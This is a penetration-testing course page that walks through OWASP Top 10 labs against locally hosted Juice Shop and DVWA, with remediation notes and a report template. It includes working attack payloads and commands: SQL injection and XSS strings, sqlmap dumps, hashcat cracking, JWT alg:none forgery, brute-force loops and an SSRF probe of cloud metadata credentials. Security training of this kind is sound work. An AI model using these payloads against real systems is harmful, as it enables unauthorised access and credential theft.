⚠ Before You Proceed

All labs in this course run exclusively against OWASP Juice Shop and DVWA — intentionally vulnerable applications running locally in Docker on your own machine. You are never permitted to target any live, production, or third-party system without written, scoped authorisation.

UK law: the Computer Misuse Act 1990 makes unauthorised access to computer systems a criminal offence, regardless of intent. "I was practising" is not a defence.

Module 2 · Recon & Mapping
Reconnaissance Against Juice Shop

With Juice Shop running on localhost:3000 and Burp Suite intercepting traffic, we begin passive and active information gathering.

STEP 1Spider the application with Burp
Configure Firefox to use Burp's proxy (127.0.0.1:8080). Browse Juice Shop normally — click every link, register an account, browse products. Burp passively captures every endpoint.
Recon · Directory bruteforce
# Enumerate hidden directories and API endpoints
$ gobuster dir -u http://localhost:3000 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x js,json,php,html -t 50
Found: /api (Status: 401)
Found: /administration (Status: 403)
Found: /login (Status: 200)
Found: /rest/products (Status: 200)
# Identify technology stack
$ curl -I http://localhost:3000 2>/dev/null | grep -E "X-Powered|Server"
X-Powered-By: Express
Server: Juice Shop (Node.js)
🛡 Defensive note — Information leakage
  • Remove X-Powered-By headers in production (app.disable('x-powered-by') in Express)
  • Return consistent 404 responses for all non-existent paths to prevent directory enumeration
  • Rate-limit requests per IP — gobuster at 50 threads is trivially detectable in logs
Modules L1–L10 · OWASP Top 10 Labs
Hands-On Exploitation & Remediation

Each card below is a self-contained lab. Expand it, follow the steps, exploit the vulnerability, then apply the defensive fix. Work through them in order.

🚨

Lab target only. Every command below targets localhost:3000 (Juice Shop) or localhost:8080 (DVWA). Never direct these techniques at any other system.

A01 Broken Access Control The Master Key ▼

What it is: The application fails to enforce who can access what. A regular user can reach admin functions, view other users' data, or modify resources they shouldn't own.

STEP 1Access the admin panel directly
Juice Shop exposes its administration area at a discoverable path. The application relies only on hiding the link — not on server-side authorisation.
Burp Suite · Repeater
# Navigate in browser (as a logged-in regular user):
GET http://localhost:3000/#/administration
→ Admin panel loads with full user list and order controls
→ No server-side check was performed
STEP 2Access another user's basket (IDOR)
Insecure Direct Object References — the API uses sequential IDs with no ownership check. Log in as user A (basket ID 1), then change the ID to reach user B's basket.
Burp Suite · Repeater
# Logged in as user with basket ID=1
GET /rest/basket/1
→ Returns YOUR basket as expected
# Now change ID to another user's basket
GET /rest/basket/2
→ Returns another user's basket! (IDOR confirmed)
🛡 Remediation
  • Enforce server-side role checks on every request — never rely on hiding UI links
  • Validate that the authenticated user owns the requested resource before returning it
  • Use indirect references (opaque tokens/UUIDs) instead of sequential database IDs in APIs
  • Implement access control unit tests that specifically assert a role cannot reach another role's resources
A02 Cryptographic Failures The Glass Safe ▼

What it is: Sensitive data transmitted or stored without adequate encryption — weak algorithms, no TLS, plain-text passwords, or crackable hashes.

STEP 1Retrieve and crack the admin hash
Juice Shop exposes a backup file containing MD5 hashed credentials. MD5 is not a password hashing algorithm — it is trivially reversible.
Terminal · hashcat
# The hash found in the exposed endpoint
echo "0192023a7bbd73250516f069df18b500" > admin.hash
# Crack with hashcat using MD5 mode (-m 0)
hashcat -m 0 -a 0 admin.hash \
/usr/share/wordlists/rockyou.txt
0192023a7bbd73250516f069df18b500:admin123
Status: Cracked in 0.4s (the danger of MD5)
🛡 Remediation
  • Use bcrypt, scrypt, or Argon2 for password hashing — never MD5, SHA-1, or unsalted SHA-256
  • Enforce TLS everywhere and use HSTS to prevent downgrade attacks
  • Never expose backup files, database dumps, or credential files through the web server
  • Classify all data and apply encryption proportionate to sensitivity
A03 Injection The Brainwash ▼

What it is: User-supplied data is interpreted as commands by the application — SQL, OS commands, LDAP queries, or HTML/JavaScript. Covers both SQLi and XSS.

STEP 1SQL Injection — bypass login
The Juice Shop login form concatenates user input directly into an SQL query. Inject a comment sequence to bypass the password check entirely.
Burp Suite · Repeater
# Intercept the login POST request in Burp and modify the body
POST /rest/user/login
{"email":"' OR 1=1--", "password":"irrelevant"}
# What the backend query becomes:
SELECT * FROM Users WHERE email='' OR 1=1--' AND password=...
→ 1=1 always true, -- comments out password check
→ Logged in as admin@juice-sh.op (first row)
STEP 2Reflected XSS in search
The search field reflects unsanitised input back into the DOM. Inject a script tag to execute arbitrary JavaScript in the victim's browser context.
Browser address bar
# Paste into browser URL bar:
http://localhost:3000/#/search?q=<iframe src="javascript:alert(`XSS`)">
→ Alert box fires — JavaScript executed in your browser
→ Real attack: replace alert() with session cookie theft
STEP 3Automated SQLi with sqlmap (DVWA)
Terminal · sqlmap
# Set DVWA security to Low, get your session cookie from Burp
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=your_session; security=low" \
--dbs --batch
available databases: information_schema, dvwa
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
admin:5f4dcc3b5aa765d61d8327deb882cf99 (MD5: password)
🛡 Remediation
  • Use parameterised queries / prepared statements — this is the single most effective SQLi defence
  • Apply a Content Security Policy (CSP) header to restrict script sources and block inline XSS
  • HTML-encode all output rendered into the DOM, especially user-supplied data
  • Use an ORM that handles parameterisation automatically and never concatenate raw user input into queries
A04 Insecure Design The Faulty Foundation ▼

What it is: Flaws baked into the design of the system before a line of code is written. No patch can fix an architecture that didn't model threats from the start.

STEP 1Exploit a flawed "forgot password" flow
Juice Shop's password reset relies on a security question — a fundamentally insecure design. Answers are guessable from public social media or the application itself.
Terminal · curl
# The admin's security question: "Name of your favourite pet?"
# Juice Shop leaks the admin email in its own scoreboard
$ curl -X POST http://localhost:3000/rest/user/reset-password \
-H "Content-Type: application/json" \
-d '{"email":"admin@juice-sh.op","answer":"wurstbrot","new":"pwned123","repeat":"pwned123"}'
→ Password reset successful — security question bypassed
🛡 Remediation
  • Replace security questions with time-based OTP (TOTP) or verified email/SMS reset flows
  • Use threat modelling (STRIDE) during design — model attack scenarios before writing code
  • Conduct security design reviews at the architecture stage, not post-implementation
A05 Security Misconfiguration The Open Vault Door ▼

What it is: Default credentials, verbose error messages, unnecessary features enabled, missing security headers, and cloud storage misconfiguration.

STEP 1Detect missing HTTP security headers
Terminal · curl
$ curl -sI http://localhost:3000 | grep -iE "strict|content-security|x-frame|referrer"
(no output — all security headers are missing)
# Check for verbose error messages
$ curl http://localhost:3000/rest/user/whoami -X DELETE
→ Full stack trace returned — technology stack exposed
🛡 Remediation
  • Implement a hardened header set: Strict-Transport-Security, Content-Security-Policy, X-Frame-Options: DENY, Referrer-Policy
  • Return generic error messages to clients — log the detail server-side only
  • Automate configuration scanning with tools like securityheaders.com in your CI/CD pipeline
  • Change all default credentials before deploying any service
A06 Vulnerable & Outdated Components The Rusty Gear ▼

What it is: Using libraries, frameworks, or components with known, published CVEs — the easiest category for an attacker to exploit since the exploit code is already public.

STEP 1Identify vulnerable dependencies
Terminal
# Retrieve the application's exposed package.json
$ curl http://localhost:3000/package.json 2>/dev/null | python3 -m json.tool | head -40
→ Full dependency tree exposed including version numbers
# Audit dependencies for CVEs
$ npm audit --json | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['metadata']['vulnerabilities'])"
{'info': 0, 'low': 14, 'moderate': 6, 'high': 4, 'critical': 2}
🛡 Remediation
  • Run npm audit, pip-audit, or Snyk in CI/CD to block builds with critical CVEs
  • Subscribe to CVE feeds for your technology stack (NVD, vendor advisories)
  • Remove unused dependencies — each library is a potential attack surface
  • Never expose package.json or requirements.txt through the web server
A07 Identification & Authentication Failures The Cloned Key ▼

What it is: Weak credential policies, missing brute-force protection, predictable session tokens, or broken JWT validation — anything that lets an attacker impersonate a legitimate user.

STEP 1Brute-force login with Burp Intruder
Burp Suite · Intruder
# 1. Intercept POST /rest/user/login in Burp Proxy
# 2. Send to Intruder (Ctrl+I)
# 3. Mark the password field as a payload position: §password§
# 4. Load payload list → /usr/share/wordlists/rockyou.txt (top 1000)
# 5. Start attack → filter by response length (200 differs from 401)
→ admin123 returns HTTP 200 → credentials confirmed
Note: No rate limiting, no CAPTCHA, no lockout → trivially bruteforceable
STEP 2Forge a JWT with "none" algorithm
Terminal · python3
# Decode the JWT you receive on login (no verification needed)
$ python3 -c "import base64,json; t='eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9'; print(json.loads(base64.b64decode(t+'==')))"
{'alg': 'RS256', 'typ': 'JWT'}
# Craft a new JWT header with "none" algorithm
# Change role to "admin" in the payload
# Remove the signature — vulnerable apps accept it
→ Application accepts alg:none → signature bypass confirmed
🛡 Remediation
  • Implement account lockout or exponential backoff after failed login attempts
  • Enforce strong password policies and check against breached-password databases (HaveIBeenPwned API)
  • Explicitly whitelist allowed JWT algorithms — reject alg:none server-side
  • Enable Multi-Factor Authentication for all privileged accounts
A08 Software & Data Integrity Failures The Poisoned Update ▼

What it is: Code and infrastructure that makes assumptions about integrity without verification — including insecure deserialization, auto-update pipelines without signature verification, and CI/CD poisoning.

STEP 1Tamper with a serialised object in a cookie
Burp Suite · Proxy
# Intercept a request, locate the base64-encoded cookie
# Decode → modify role from "user" to "admin" → re-encode
$ echo '{"id":1,"role":"user"}' | base64
eyJpZCI6MSwicm9sZSI6InVzZXIifQ==
$ echo '{"id":1,"role":"admin"}' | base64
eyJpZCI6MSwicm9sZSI6ImFkbWluIn0=
→ Replace cookie in Burp and forward → privilege escalated
🛡 Remediation
  • Sign serialised objects with HMAC — verify the signature before deserialising
  • Never trust client-supplied data for privilege or role decisions — derive these server-side from an authenticated session
  • Verify software update package signatures before installation in CI/CD pipelines
A09 Security Logging & Monitoring Failures The Silent Alarm ▼

What it is: Attacks go undetected because logs are missing, insufficient, or not monitored. The average breach dwell time is over 200 days — often because nobody was watching.

STEP 1Demonstrate lack of detection
Terminal
# Run 200 failed login attempts — no lockout, no alert
$ for i in $(seq 1 200); do \
curl -s -X POST http://localhost:3000/rest/user/login \
-H "Content-Type: application/json" \
-d "{\"email\":\"admin@juice-sh.op\",\"password\":\"attempt$i\"}" > /dev/null; \
done
# Check what Juice Shop logged
$ docker logs juice-shop 2>&1 | grep -i "login\|fail\|auth" | tail -5
(no dedicated auth failure log — attack was invisible)
🛡 Remediation
  • Log all authentication events (success and failure) with IP, timestamp, and user identifier
  • Alert on threshold breaches — more than 5 failed logins in 60s from one IP should trigger an alert
  • Ship logs to a centralised SIEM (Splunk, Elastic, CloudWatch) — don't keep logs only on the app server
  • Test your detection by running this brute-force exercise against your monitoring stack
A10 Server-Side Request Forgery The Insider Proxy ▼

What it is: The server is tricked into making HTTP requests on the attacker's behalf — to internal services, cloud metadata endpoints, or localhost resources that should never be reachable from outside.

STEP 1Probe internal services via SSRF
Burp Suite · Repeater
# Find a URL parameter the server fetches (e.g., image importer)
POST /api/products/1/image
{"imageUrl":"http://localhost:8080/admin"}
→ Server fetches localhost:8080 and returns its HTML
# On AWS — probe for cloud metadata
{"imageUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
→ IAM role credentials returned → full cloud account compromise
🛡 Remediation
  • Validate and sanitise all client-supplied URLs — use an allowlist of permitted domains/IP ranges
  • Block requests to private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x) at the network layer
  • On cloud infrastructure, block access to the IMDS endpoint at the instance/security group level
  • Use IMDSv2 (token-based) on AWS to make SSRF-based metadata theft significantly harder
Module 3 · Professional Output
VAPT Report Structure

The report is the deliverable. A client cannot act on vulnerabilities they cannot read or understand. Every finding needs evidence, business impact, and a specific remediation step.

ℹ

Tool-driven vs logic-based testing. Automated scanners (Nikto, OWASP ZAP) find low-hanging fruit. The vulnerabilities that cause real breaches — IDOR, business logic flaws, auth bypass — require a human tester reasoning about the application. Always supplement tools with manual logic-based testing.

1 · Executive Summary

  • Engagement scope and duration
  • Total findings by severity (Critical/High/Medium/Low/Info)
  • Most critical finding headline (non-technical)
  • Overall risk posture assessment
  • Top 3 prioritised remediation actions

2 · Methodology

  • Testing type (black/grey/white box)
  • Frameworks used (OWASP, PTES, OSSTMM)
  • Tools used with versions
  • Testing timeline and phases
  • Scope definition and exclusions

3 · Finding Template (per vuln)

  • Title + CVSS v3.1 score
  • CWE / OWASP category reference
  • Description and proof of concept
  • Evidence: screenshots + HTTP requests
  • Business impact
  • Specific remediation steps

4 · Remediation Matrix

  • All findings tabulated by severity
  • Owner assigned per finding
  • Remediation deadline recommendation
  • Re-test status column (for follow-up)
Finding template — CVSS scoring example
Title: SQL Injection in Login Endpoint (A03)
CVSS: 9.8 (Critical) AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CWE: CWE-89 — Improper Neutralisation of SQL Commands
Evidence: POST /rest/user/login with payload: ' OR 1=1--
Response: HTTP 200 + JWT token for admin@juice-sh.op
Impact: Full authentication bypass; access to all user data
Fix: Replace string concatenation with parameterised queries
Priority: P1 — Remediate within 24 hours
Module 4 · Career Pathways
Bug Bounty vs Corporate Pentesting

Two distinct paths, both requiring the same technical depth — but different soft skills, structures, and risk tolerance.

INDEPENDENT Bug Bounty

Work on public programmes (HackerOne, Bugcrowd). Self-directed, asynchronous, and paid per valid finding. High variance income, but excellent for building a public reputation and developing breadth of testing experience rapidly.

CORPORATE Pentest Engagements

Structured, scoped, time-boxed engagements with a professional report as the deliverable. Requires written Rules of Engagement, legal sign-off, and consistent professional standards. Typically more stable income through consultancy or employment.
